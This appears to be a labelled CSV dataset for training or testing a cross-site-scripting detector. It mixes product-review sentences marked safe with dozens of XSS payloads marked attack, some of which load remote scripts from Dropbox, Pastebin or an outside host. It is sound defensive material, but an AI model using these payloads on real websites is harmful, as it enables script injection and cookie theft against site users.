,sentence,label
0,<input onfocus=write(xss) autofocus>,attack
1,%22/%3E%3cBODY%20ONloAD=�documenT.WriTE(%22%3cs%22%2b%22CripT%20SRc=http://My.boX.Com/xSs.js%3E%3C/sCRiPT%3e%22)�%3e,attack
2,Cheap but hey it works.. Was pleasantly suprised given the low cost of this item.,safe
3,"<div style=""background-image: url(javascript:alert('xss'))"">",attack
4,"<EMBEd SRC=""DatA:imagE/svg+XML;bASe64,Phn2Zyb4BWXUcZpZDmc9imH0dh a6ly93D3CUdZmuB3jNLZIWMDAVC3znIIB4bWXUcz0IAhR0cDoVL3D3Dy53My5VCmCV mJAwmc9ZDmCIihHtbG5zOnHsaW5rpsJoDhRwOI8VD3d3lncZLM9YZY8xotK5l3hS aW5riIB2ZXjZaw9uPsIXLJAiihg9IJAIIhK9IJAIIHDPzHROpsIxotQiiGhlAwDodd0Imjaw IibPZd0IEhnzIJ48C2NyAXb0Ihr5cGU9iNRlEhqVZwNTyXnjCMlwdCI+YwxlcnQOilH TUYipoZwvc2NYaxb0PJwvc3ZnpG=="" TypE=""image/svG+Xml"" ALlowSCRiPtacCEsS=""ALWAYs""></EmBEd>",attack
5,"&lt;layer src=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/layer&gt;",attack
6,"<tAble bAckgrOUND=""JAvaScRIPT:aleRT('XSs')"">",attack
7,<script/&tab; src='https://dl.dropbox.com/u/13018058/js.js' /&tab;></script>,attack
8,"&LT;LINK REL=\""STYLESHEET\"" HREF=\""JAVASCRIPT&#058;ALERT('XSS');\""&GT;",attack
9,"<div draggable=""true"" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable>drop here</xss>",attack
10,"</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/%00*/onerror='eval(src)'>",attack
11,"&LT;STYLE&GT;@IM\PORT'\JA\VASC\RIPT&#58;ALERT(\""XSS\"")';&LT;/STYLE&GT;",attack
12,My phone doesn't slide around my car now and the grip prevents my phone from slipping out of my hand.,safe
13,Poor quality.,safe
14,"&lt;IMG DYNSRC=\""javascript&#058;alert('XSS')\""&gt;",attack
15,DO NOT BUY DO NOT BUYIT SUCKS,safe
16,"Other than that, the leather is nice and soft; the fit is very tight; the cut out for the face is a good shape.",safe
17,"&lt;bgsound src=\""javascript&#058;alert('xss');\""&gt;",attack
18,<iFRAme/Src=jaVAscRIpT:ALErt(1)>,attack
19,"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",attack
20,%2BACIAPGA8-SCRIPT%2BAD4-ALERT%28DOCUMENT.LOCATION%29%2BADW-%2FSCRIPT%2BAD4APAAI-,attack
21,<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?,attack
22,<BODY ONLOAD=alert('hellox worldss')>,attack
23,<h1><font color=blue>hellox worldss</h1>,attack
24,You get what you pay for I guess.,safe
25,"&lt;img style=\""xss&#58;expr/*xss*/ession(alert('xss'))\""&gt;",attack
26,//<FORM/ACTION=JAVASCRIPT&#X3A;ALERT&LPAR;DOCUMENT&PERIOD;COOKIE&RPAR;><INPUT/TYPE='SUBMIT'>//,attack
27,"<% foo><x foo=""%><script>alert(123)</script>"">",attack
28,"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",attack
29,"<iFRaME src=""jAvasCrIPt:aleRT('xSS');""></IfRAmE>",attack
30,"&LT;liNK ReL=\""sTyLESHEET\"" hrEF=\""javaScrIPT&#058;aLErT('XSs');\""&gT;",attack
31,"<IFRAME XMLNS=""#"" SRC=""JAVASCRIPT:ALERT(1)""></IFRAME>",attack
32,Cumbersome design.,safe
33,Would not reccommend.,safe
34,<Svg><sTylE>{FOnt-FAmILy&cOLon;'<IFRAme/oNlOaD=cOnfiRM(1)>',attack
35,<IMG/&#09;&#10;&#11; SRC=`~` ONERROR=PROMPT(1)>,attack
36,The nano stated it.My son was dissapointed.,safe
37,<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,attack
38,"<EMBED SRC=""HTTP://CORKAMI.GOOGLECODE.COM/SVN/!SVN/BC/480/TRUNK/MISC/PDF/HELLOWORLD_JS_X.PDF"">",attack
39,"<iframe %00 src=""&tab;javascript:prompt(1)&tab;""%00>",attack
40,"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_x.pdf"">",attack
41,This is a great phone!.,safe
42,"<tablE><td BacKgROunD=""jAVASCRIPT:ALERt('XSs')"">",attack
43,"&lt;img src=\""jav&#x0d;ascript&#058;alert('xss');\""&gt;",attack
44,"I have to use the smallest earpieces provided, but it stays on pretty well.",safe
45,Then a few days later the a puff of smoke came out of the phone while in use.,safe
46,"Bluetooth does not work, phone locks up, screens just flash up and now it just makes calls randomly while in my pocket locked.",safe
47,"DOCUMENT.QUERYSELECTOR('DIV').INNERHTML=""<IFRAME SRC='JAVASCRIPT:VAR S = DOCUMENT.CREATEELEMENT(\""SCRIPT\"");S.SRC = \""HTTPS://PASTEBIN.COM/RAW/DW5CWGK6\"";DOCUMENT.BODY.APPENDCHILD(S);'></IFRAME>"";",attack
48,"<STYLE>@IM\PORT'\JA\VASC\RIPT:ALERT(""XSS"")';</STYLE>",attack
49,"However, BT headsets are currently not good for real time games like first-person shooters since the audio delay messes me up.",safe
50,"When I placed my treo into the case, not only was it NOT snug, but there was A LOT of extra room on the sides.",safe
51,"&lt;style&gt;@im\port'\ja\vasc\ript&#58;alert(\""xss\"")';&lt;/style&gt;",attack
52,All the other cases I've tried normally fall apart after a few months but this one seems to be in for the long haul.,safe
53,"I only used it two days, and it wasn't always easy to hear with.",safe
54,<a id=x tabindex=1 onfocusin=alert(1)></a>,attack
55,"<audio autoplay onplaying=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",attack
56,%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-,attack
57,"I posted more detailed comments under the grey or black phone, but i have the Fire Red and it's a great color!",safe
58,"<scripT>cryptO.GeneRAtECrmFREqUESt('CN=0',0,0,NuLl,'alErT(1)',384,NulL,'RSa-Dual-use')</scRipT>",attack
